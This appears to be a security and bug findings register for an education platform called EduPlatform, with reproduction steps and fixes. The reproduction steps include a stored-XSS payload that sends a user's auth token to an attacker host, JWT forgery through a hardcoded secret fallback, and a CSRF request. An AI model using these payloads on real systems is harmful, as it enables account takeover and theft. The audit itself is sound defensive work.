# 🐛 EDUPLATFORM - COMPREHENSIVE FINDINGS REGISTER

## Bug Registry Format

Each finding includes:
- **ID**: Unique identifier
- **Agent**: Which agent discovered it
- **Severity**: CRITICAL | HIGH | MEDIUM | LOW | INFO
- **Category**: Security | Integration | Database | Frontend | Backend | DevOps
- **Component**: Affected module/file
- **Description**: What is wrong
- **Steps to Reproduce**: How to trigger the issue
- **Expected**: What should happen
- **Actual**: What actually happens
- **Root Cause**: Technical explanation
- **Impact**: Business/security consequences
- **Evidence**: File locations, line numbers
- **Fix**: Proposed solution
- **Status**: OPEN | IN_PROGRESS | FIXED

---

## CRITICAL FINDINGS (8)

### CRITICAL-001: WebSocket JWT Hardcoded Secret Fallback
**Agent:** Security/Pentest  
**Category:** Security  
**Component:** `backend/src/websocket/wsServer.ts:26`  
**Severity:** 10.0 (Critical)

**Description:**
WebSocket server has hardcoded JWT secret fallback enabling complete authentication bypass.

**Steps to Reproduce:**
1. Create JWT with payload `{id: "user-uuid", email: "attacker@evil.com", role: "admin"}`
2. Sign with secret `'secret'` (hardcoded fallback)
3. Connect to WebSocket: `ws://host?token=<forged_token>`
4. Connection accepted with admin privileges

**Expected:** WebSocket rejects forged token, closes connection with error

**Actual:** WebSocket accepts forged token if JWT_SECRET env var not set

**Root Cause:**
```typescript
jwt.verify(token, process.env.JWT_SECRET || 'secret')
```
Fallback allows predictable secret to be used for token forgery.

**Impact:**
- Complete authentication bypass for WebSocket features
- Attacker can impersonate any user including admins
- Real-time notifications/updates can be intercepted

**Evidence:** `backend/src/websocket/wsServer.ts:26`

**Fix:**
```typescript
const secret = process.env.JWT_SECRET;
if (!secret) {
  console.error('CRITICAL: JWT_SECRET not set');
  ws.close(1008, 'Server configuration error');
  return;
}
jwt.verify(token, secret)
```

**Status:** OPEN

---

### CRITICAL-002: No CSRF Protection
**Agent:** Security/Pentest  
**Category:** Security  
**Component:** ALL endpoints  
**Severity:** 8.1 (High)

**Description:**
No CSRF token validation on state-changing endpoints. Attackers can forge requests from malicious sites.

**Steps to Reproduce:**
1. User logs into EduPlatform
2. User visits attacker's website while authenticated
3. Attacker's page contains:
```html
<script>
fetch('https://eduplatform.com/api/notes', {
  method: 'POST',
  headers: {'Authorization': 'Bearer ' + stolen_token},
  body: JSON.stringify({title: 'Malicious', content: 'XSS'})
});
</script>
```
4. Request executes with user's credentials

**Expected:** Request rejected with 403 CSRF token invalid

**Actual:** Request succeeds, malicious note created

**Root Cause:** No CSRF middleware installed or configured

**Impact:**
- Unauthorized actions on behalf of users
- Data creation/modification/deletion
- Password changes
- Account settings modifications

**Evidence:** Search for `csrf|csurf` in codebase returns 0 results

**Fix:**
1. Install: `npm install csurf @types/csurf`
2. Add middleware:
```typescript
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);
```
3. Return CSRF token to frontend
4. Include in all state-changing requests

**Status:** OPEN

---

### CRITICAL-003: Stored XSS in Multiple Fields
**Agent:** Security/Pentest  
**Category:** Security  
**Component:** `notes.ts`, `courses.ts`, `schedule.ts`  
**Severity:** 9.3 (Critical)

**Description:**
No input sanitization on user-generated content. XSS payloads stored in database and executed when viewed.

**Steps to Reproduce:**
```bash
POST /api/notes
Authorization: Bearer <token>
Content-Type: application/json

{
  "title": "<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token'))</script>",
  "content": "<img src=x onerror=\"alert(document.cookie)\">",
  "category": "test"
}
```

When victim views note, JavaScript executes in their browser.

**Expected:** Input sanitized, script tags escaped or removed

**Actual:** Raw HTML/JavaScript stored and rendered

**Root Cause:** No sanitization library used (DOMPurify, validator, xss-filters missing from dependencies)

**Impact:**
- Account takeover via token theft
- Cookie hijacking
- Keylogging
- Phishing
- Arbitrary code execution in victim's browser

**Evidence:**
- `backend/src/routes/notes.ts:34` - No sanitization before INSERT
- `backend/src/routes/courses.ts:48` - title/description unsanitized
- `backend/src/routes/schedule.ts:73` - title/description unsanitized

**Fix:**
1. Install: `npm install isomorphic-dompurify`
2. Sanitize all inputs:
```typescript
import DOMPurify from 'isomorphic-dompurify';

const sanitizedTitle = DOMPurify.sanitize(title);
const sanitizedContent = DOMPurify.sanitize(content);
```

**Status:** OPEN

---

### CRITICAL-004: Frontend/Backend Type Incompatibility
**Agent:** Integration  
**Category:** Integration  
**Component:** All API responses  
**Severity:** HIGH

**Description:**
Backend returns snake_case, frontend expects camelCase. No transformation layer exists.

**Steps to Reproduce:**
1. Start backend and frontend
2. Login successfully
3. Navigate to /dashboard
4. Observe console errors and missing data rendering

**Expected:** User data displays correctly (firstName, lastName, etc.)

**Actual:** 
```javascript
// Backend response:
{ first_name: "John", last_name: "Doe", created_at: "2024-01-01" }

// Frontend tries to access:
user.firstName  // undefined
user.lastName   // undefined
user.createdAt  // undefined
```

**Root Cause:** 
- PostgreSQL columns: snake_case
- Backend returns raw query results: snake_case
- Frontend TypeScript interfaces: camelCase
- No transformation middleware

**Impact:**
- ALL data rendering fails or displays incorrectly
- User experience completely broken
- Application appears non-functional

**Evidence:**
- `backend/src/types/index.ts` - Backend types use snake_case
- `frontend/src/types/index.ts` - Frontend types use camelCase
- NO transformation in `backend/src/index.ts` or `frontend/src/services/api.ts`

**Fix:**
**Option 1 - Backend transformation:**
```typescript
// middleware/transformResponse.ts
const toCamelCase = (obj: any): any => {
  if (Array.isArray(obj)) return obj.map(toCamelCase);
  if (obj !== null && typeof obj === 'object') {
    return Object.keys(obj).reduce((result, key) => {
      const camelKey = key.replace(/_([a-z])/g, (_, letter) => letter.toUpperCase());
      result[camelKey] = toCamelCase(obj[key]);
      return result;
    }, {} as any);
  }
  return obj;
};

app.use((req, res, next) => {
  const originalJson = res.json.bind(res);
  res.json = (data) => originalJson(toCamelCase(data));
  next();
});
```

**Option 2 - Frontend transformation:**
Add Axios response interceptor in `api.ts`

**Status:** OPEN

---

### CRITICAL-005: Database Schema Conflict
**Agent:** Database  
**Category:** Database  
**Component:** `init.sql` vs `migrate.ts`  
**Severity:** CRITICAL

**Description:**
Two completely incompatible database schemas exist. Application uses migrate.ts but docker-compose mounts init.sql.

**Schema Differences:**

**init.sql (OLD):**
```sql
levels (id, course_id, title, ...)  -- references courses
lessons (id, level_id, ...)          -- references levels
```

**migrate.ts (CURRENT):**
```sql
levels (id, name, code, ...)         -- standalone, no course_id
lessons (id, course_id, ...)         -- references courses directly
```

**Steps to Reproduce:**
1. `docker-compose up` uses init.sql for initialization
2. Backend queries assume migrate.ts schema
3. Foreign key violations occur
4. Application crashes

**Expected:** Single source of truth for database schema

**Actual:** Two conflicting schemas coexist

**Root Cause:** init.sql is obsolete but still referenced in docker-compose.yml:13

**Impact:**
- Application crashes if wrong schema used
- Data corruption possible
- Unpredictable behavior

**Evidence:**
- `docker-compose.yml:13` mounts init.sql
- `backend/src/db/migrate.ts` defines actual schema
- Backend queries use migrate.ts structure

**Fix:**
1. **IMMEDIATE:** Delete or rename init.sql to init.sql.OLD
2. Update docker-compose.yml to not mount any init script
3. Run migrations via `npm run db:migrate` explicitly
4. Document migration process in README

**Status:** OPEN

---

### CRITICAL-006: Insecure Docker Secret Defaults
**Agent:** DevOps  
**Category:** Security/DevOps  
**Component:** `docker-compose.yml:32`  
**Severity:** HIGH

**Description:**
Docker Compose has weak fallback secrets. Container starts with predictable JWT_SECRET if .env missing.

**Steps to Reproduce:**
1. Delete .env file
2. Run `docker-compose up`
3. Container starts successfully
4. JWT_SECRET = "change-this-secret-in-production"
5. Forge tokens with this secret

**Expected:** Application exits with error if JWT_SECRET not provided

**Actual:** Application starts with weak default

**Root Cause:**
```yaml
JWT_SECRET: ${JWT_SECRET:-change-this-secret-in-production}
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-eduplatform_password}
```

**Impact:**
- Token forgery possible
- Complete authentication bypass
- Database compromise

**Evidence:** `docker-compose.yml:32, 10`

**Fix:**
```yaml
JWT_SECRET: ${JWT_SECRET}  # No fallback, required
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}  # No fallback, required
```

Add startup validation in backend to exit if variables missing.

**Status:** OPEN

---

### CRITICAL-007: Teacher Can Modify Any Course
**Agent:** Backend/Security  
**Category:** Authorization  
**Component:** `backend/src/routes/courses.ts:59-75`  
**Severity:** 7.1 (High)

**Description:**
Any teacher can update/delete any other teacher's courses. No ownership validation.

**Steps to Reproduce:**
```bash
# Teacher A creates course
POST /api/courses
Authorization: Bearer <TEACHER_A_TOKEN>
{"title": "Teacher A's Course"}
# Response: {"id": "course-123", ...}

# Teacher B modifies it
PUT /api/courses/course-123
Authorization: Bearer <TEACHER_B_TOKEN>
{"title": "Hijacked by Teacher B", "is_published": false}
# Response: 200 OK - update succeeds
```

**Expected:** 403 Forbidden - Teacher B cannot modify Teacher A's course

**Actual:** 200 OK - Update succeeds

**Root Cause:**
```typescript
if (req.user?.role !== 'admin' && req.user?.role !== 'teacher') {
  return res.status(403).json({ message: 'Forbidden' });
}
// Missing: Check if teacher created this course
UPDATE courses SET ... WHERE id = $7  // No creator_id check
```

**Impact:**
- Teachers can sabotage competitors
- Unpublish other teachers' content
- Modify course materials
- Data integrity compromised

**Evidence:** `backend/src/routes/courses.ts:59-75`

**Fix:**
Add creator_id column to courses table (or use course_teachers junction):
```typescript
// Check ownership
const courseCheck = await pool.query('SELECT creator_id FROM courses WHERE id = $1', [id]);
if (courseCheck.rows[0].creator_id !== req.user.id && req.user.role !== 'admin') {
  return res.status(403).json({ message: 'Forbidden' });
}
```

**Status:** OPEN

---

### CRITICAL-008: Mock Password Reset
**Agent:** Backend  
**Category:** Business Logic  
**Component:** `backend/src/routes/auth.ts:63-65`  
**Severity:** 7.5 (High)

**Description:**
Password reset endpoint is non-functional mock. Always returns success.

**Steps to Reproduce:**
```bash
POST /api/auth/forgot-password
{"email": "nonexistent@fake.com"}

# Response: 200 OK
{"message": "Password reset link sent (mock)"}
```

**Expected:** Generate reset token, send email with reset link

**Actual:** Returns success message with no action

**Root Cause:**
```typescript
router.post('/forgot-password', async (req, res) => {
  res.json({ message: 'Password reset link sent (mock)' });
});
```

**Impact:**
- Users cannot recover accounts
- False sense of security
- Customer support burden

**Evidence:** `backend/src/routes/auth.ts:63-65`

**Fix:**
1. Generate secure random token
2. Store in password_reset_tokens table with expiration
3. Send email via email service (SendGrid, AWS SES)
4. Implement /reset-password endpoint to validate token and update password

**Status:** OPEN

---

## HIGH PRIORITY FINDINGS (4)

### HIGH-001: Stateless JWT Without Revocation
**Agent:** Security  
**Severity:** 6.5 (Medium-High)  
**Component:** `backend/src/routes/auth.ts:56-58`

**Description:** Logout doesn't invalidate tokens. Stolen tokens valid for 7 days.

**Fix:** Implement token blacklist (Redis) or switch to refresh/access token pattern.

**Status:** OPEN

---

### HIGH-002: Missing Input Validation (90% endpoints)
**Agent:** Backend  
**Severity:** 6.9 (Medium-High)  
**Component:** All routes except auth

**Description:** Only 2 endpoints use Zod validation. Others accept unvalidated input.

**Fix:** Create Zod schemas for all endpoints, add validate() middleware.

**Status:** OPEN

---

### HIGH-003: Frontend Pages Use Mock Data
**Agent:** Frontend  
**Severity:** High  
**Component:** All pages except login/register

**Description:** Pages import MOCK data directly, never call API services.

**Evidence:**
```typescript
// DashboardPage.tsx:5-6
import { MOCK_STATS, MOCK_SCHEDULE, MOCK_NOTES } from '../utils/mockData';
// API services defined but unused
```

**Fix:** Remove mock imports, implement proper data fetching with useState/useEffect.

**Status:** OPEN

---

### HIGH-004: Missing Database Indexes
**Agent:** Database  
**Severity:** Medium-High  
**Component:** Database schema

**Description:** Performance-critical indexes missing on sessions.token_hash, schedule.start_time, notifications(user_id, is_read).

**Fix:**
```sql
CREATE INDEX idx_sessions_token_hash ON sessions(token_hash);
CREATE INDEX idx_schedule_start_time ON schedule(start_time);
CREATE INDEX idx_notifications_user_read ON notifications(user_id, is_read);
```

**Status:** OPEN

---

## MEDIUM PRIORITY FINDINGS (Summary)

8 MEDIUM findings identified:

- Database constraint violations possible (no CHECK constraints)
- Concurrency race condition on lesson_progress counter
- Information disclosure via error messages
- No audit logging
- CORS credentials enabled unnecessarily
- Rate limit bypass via IP spoofing
- No pagination on list endpoints
- Missing WebSocket backend health check

(Full details in specialized reports)

---

## LOW PRIORITY FINDINGS (Summary)

4 LOW findings identified:

- No soft delete (permanent data loss)
- Stack traces in development mode
- Missing API versioning
- No request ID tracking

---

## INFO FINDINGS (Summary)

6 INFO findings identified:

- Documentation gaps
- Inconsistent error response format
- Missing TypeScript strict mode
- No code comments in complex logic
- Unused dependencies
- Missing linter rules

---

## Remediation Summary

| Severity | Count | Est. Time | Priority |
|----------|-------|-----------|----------|
| CRITICAL | 8 | 3-5 days | P0 (Blocker) |
| HIGH | 4 | 2-3 days | P1 (Pre-production) |
| MEDIUM | 8 | 1-2 weeks | P2 (Post-launch) |
| LOW | 4 | 1 week | P3 (Backlog) |
| INFO | 6 | 2-3 days | P4 (Polish) |
| **TOTAL** | **30** | **3-4 weeks** | |

---

## Verification Checklist

Before marking any finding as FIXED, verify:

- [ ] Fix implemented in code
- [ ] Automated test added (if applicable)
- [ ] Manual testing performed
- [ ] No regressions introduced
- [ ] Documentation updated
- [ ] Security implications reviewed
- [ ] Performance impact assessed

---

**Findings Last Updated:** September 24, 2026  
**Next Review:** After Phase 1 remediation
